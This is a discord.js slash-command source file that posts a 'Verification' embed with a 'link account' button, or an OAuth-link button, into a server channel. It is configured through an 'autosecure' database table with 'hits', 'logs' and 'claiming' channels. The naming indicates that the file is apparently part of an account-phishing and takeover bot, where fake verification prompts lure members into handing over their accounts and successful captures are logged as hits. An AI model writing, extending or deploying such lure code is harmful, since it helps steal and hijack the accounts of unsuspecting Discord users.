const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ApplicationCommandOptionType,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
} = require("discord.js");
const { queryParams } = require("../../../db/database");
const getEmbed = require("../../utils/responses/getEmbed");
const getButton = require("../../utils/responses/getButton");
const generate = require("../../utils/generate");

module.exports = {
  name: "embed",
  description: "Send your embed",
  options: [
    {
      name: "type",
      description: "The type of the embed to send",
      type: ApplicationCommandOptionType.String,
      required: true,
      choices: [
        {
          name: "Verification [/responses]",
          value: "main",
        },
        {
          name: "OAUTH [/responses]",
          value: "oauth",
        },
        {
          name: "Import JSON Format [one-time]",
          value: "json",
        },
      ],
    },
    {
      name: "extrabutton",
      description: "Edit the button and the embed in /responses",
      type: ApplicationCommandOptionType.String,
      required: true,
      choices: [
        {
          name: "Hide (Only shows normal button)",
          value: "no",
        },
        {
          name: "Show (Normal button & extra button)",
          value: "yes",
        },
        {
          name: "Only send embed (no buttons at all)",
          value: "hideall",
        },
      ],
    },
  ],
  sendembeds: true, 
  callback: async (client, interaction) => {
    if (!interaction.guild) {
      return interaction.reply({
        content: "Cannot send embed in DMs. If you're not in DMS, you invited the bot via User-Install. \n This is not a correct way to invite the bot. You need to use the Invite-Link in /bots. Please remove the bot from Authorized Apps in ur Discord Settings and re-add it the normal way!",
        ephemeral: true,
      });
    }

    const choice = interaction.options.getString("type");
    const buttonOption = interaction.options.getString("extrabutton");
    const showExtraButton = buttonOption === "yes";
    const hideAllButtons = buttonOption === "hideall";
    const userId = client.username;

    if (choice === "json") {
      const rId = generate(32);
      await client.queryParams(
        `INSERT INTO actions (id, action) VALUES (?, ?)`,
        [rId, `sendjson|${userId}|${showExtraButton}|${hideAllButtons}`]
      );

      const modal = new ModalBuilder()
        .setCustomId(`action|${rId}`)
        .setTitle("Import Discohook JSON");

      const jsonInput = new TextInputBuilder()
        .setCustomId("json")
        .setLabel("Paste your Discohook JSON here")
        .setStyle(TextInputStyle.Paragraph)
        .setMinLength(10)
        .setMaxLength(4000)
        .setRequired(true);

      const firstActionRow = new ActionRowBuilder().addComponents(jsonInput);
      modal.addComponents(firstActionRow);

      await interaction.showModal(modal);
      return;
    }

    let [settings] = await client.queryParams(
      `SELECT * FROM autosecure WHERE user_id=?`,
      [userId]
    );

    if (!settings) {
      return interaction.reply({
        content: `Please set your server first using /set!`,
        ephemeral: true,
      });
    }

    if (settings.server_id && settings.server_id !== interaction.guild.id) {
      return interaction.reply({
        content: `You can only use this bot in 1 server. Use /set to set your server.`,
        ephemeral: true,
      });
    }

    const missingItems = [];
    if (!settings.server_id) missingItems.push("server");
    if (!settings.logs_channel) missingItems.push("logs channel");
    if (!settings.hits_channel) missingItems.push("hits channel");

    if (settings.claiming === 1) {
      if (!settings.notification_channel) missingItems.push("notifications channel");
      if (!settings.users_channel) missingItems.push("users channel");
    }

    if (missingItems.length > 0) {
      return interaction.reply({
        content: `Please set the following: ${missingItems.join(", ")}.`,
        ephemeral: true,
      });
    }

    const channelsToCheck = [
      { name: "logs", id: settings.logs_channel },
      { name: "hits", id: settings.hits_channel },
    ];

    if (settings.claiming === 1) {
      channelsToCheck.push(
        { name: "notifications", id: settings.notification_channel },
        { name: "users", id: settings.users_channel }
      );
    }

    for (const { name, id } of channelsToCheck) {
      const channelIds = id.split("|");
      let channelAccessible = false;
      for (const channelId of channelIds) {
        try {
          const channel = await client.channels.fetch(channelId.trim());
          if (channel?.permissionsFor(client.user)?.has("SEND_MESSAGES")) {
            channelAccessible = true;
            break;
          }
        } catch (e) {
          console.error(`Channel access error: ${e.message}`);
        }
      }
      if (!channelAccessible) {
        return interaction.reply({
          content: `Bot cannot send messages in the ${name} channel. Please check permissions.`,
          ephemeral: true,
        });
      }
    }

    try {
      const addExtraButton = async (actionRow) => {
        if (!showExtraButton) return actionRow;
        
        const [extraButtonData] = await client.queryParams(
          `SELECT * FROM embeds WHERE user_id=? AND type=?`,
          [userId, "extrabutton"]
        );
        
        if (!extraButtonData) {
          throw new Error("Please set the extrabutton embed first!");
        }

        const extraButtonJson = await getButton(client, "extrabutton");
        const cleanExtraButtonData = JSON.parse(JSON.stringify(extraButtonJson.data));
        delete cleanExtraButtonData.id;
        cleanExtraButtonData.custom_id = "extrabutton";
        
        actionRow.addComponents(ButtonBuilder.from(cleanExtraButtonData));
        return actionRow;
      };

      if (choice === "main") {
        const embed = await getEmbed(client, "main");

        if (hideAllButtons) {
          await interaction.channel.send({ embeds: [embed] });
        } else {
          const buttonData = await getButton(client, "link account");
          const cleanButtonData = JSON.parse(JSON.stringify(buttonData.data));
          delete cleanButtonData.id;
          cleanButtonData.custom_id = cleanButtonData.custom_id || "link_account";

          let actionRow = new ActionRowBuilder().addComponents(
            ButtonBuilder.from(cleanButtonData)
          );

          if (showExtraButton) {
            actionRow = await addExtraButton(actionRow);
          }

          await interaction.channel.send({
            embeds: [embed],
            components: [actionRow],
          });
        }
      } 
      else if (choice === "oauth") {
        const [oauthLink] = await client.queryParams(
          `SELECT oauth_link FROM autosecure WHERE user_id=?`,
          [userId]
        );

        if (!oauthLink?.oauth_link) {
          return interaction.reply({
            content: `Set your OAUTH link first!`,
            ephemeral: true,
          });
        }

        const embed = await getEmbed(client, "oauth");

        if (hideAllButtons) {
          await interaction.channel.send({ embeds: [embed] });
        } else {
          const buttonData = await getButton(client, "oauth", {
            url: oauthLink.oauth_link,
          });
          const cleanButtonData = JSON.parse(JSON.stringify(buttonData.data));
          delete cleanButtonData.id;
          delete cleanButtonData.custom_id;
          cleanButtonData.url = oauthLink.oauth_link;
          cleanButtonData.style = ButtonStyle.Link;

          let actionRow = new ActionRowBuilder().addComponents(
            ButtonBuilder.from(cleanButtonData)
          );

          if (showExtraButton) {
            actionRow = await addExtraButton(actionRow);
          }

          await interaction.channel.send({
            embeds: [embed],
            components: [actionRow],
          });
        }
      }

      return interaction.reply({ content: "✅", ephemeral: true });
    } catch (error) {
    //  console.error("Error in embed command:", error);
      return interaction.reply({
        content: error.message || "Failed to send the message",
        ephemeral: true,
      });
    }
  },
};